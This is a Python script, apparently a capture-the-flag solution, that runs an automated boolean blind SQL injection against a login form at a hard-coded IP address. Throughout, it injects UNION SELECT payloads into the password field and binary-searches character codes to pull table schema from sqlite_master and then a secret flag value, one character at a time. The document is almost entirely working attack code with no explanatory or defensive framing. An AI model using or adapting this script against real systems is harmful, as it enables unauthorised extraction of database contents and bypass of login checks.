import requests

BASE_URL = 'http://18.194.166.81:3334/old-login'

def tryUrl(param, pos):
    url = BASE_URL
    # CREATE TABLE flag (FlaggedFlag T
    #post_data = {'uname': 'admin', 'psw': "' or 1=2 union select 1,tbl_name from sqlite_master where tbl_name='flag' and hex(substr(sql," + str(pos + 1) + ",1)) >= hex('" + param + "');--" }
    post_data = {'uname': 'admin', 'psw': "' or 1=2 union select 1,FlaggedFlag from flag where hex(substr(FlaggedFlag," + str(pos + 1) + ",1)) >= hex('" + param + "');--" }
    print(post_data)
    response = requests.post(url, data=post_data, allow_redirects=False)
    #print(response.content)
    if b'did' in response.content:
        return True
    else:
        return False

def probeNextColChar(pos):
    lowGuessIndex = 32
    highGuessIndex = 126
    
    while lowGuessIndex < highGuessIndex:
        guessIndex = lowGuessIndex + (highGuessIndex - lowGuessIndex) // 2;
        guess = chr(guessIndex)

        if tryUrl(guess, pos):
            if lowGuessIndex == guessIndex:
                return guess
            lowGuessIndex = guessIndex
        else:
            highGuessIndex = guessIndex
    
    return False

#nextChar = probeNextColChar(4)
#print(nextChar)


flag = ''
pos = 0

while True:
    nextChar = probeNextColChar(pos)
    if not nextChar:
        break
    flag += nextChar
    pos += 1
    print("flag so far:", flag)

print(flag)


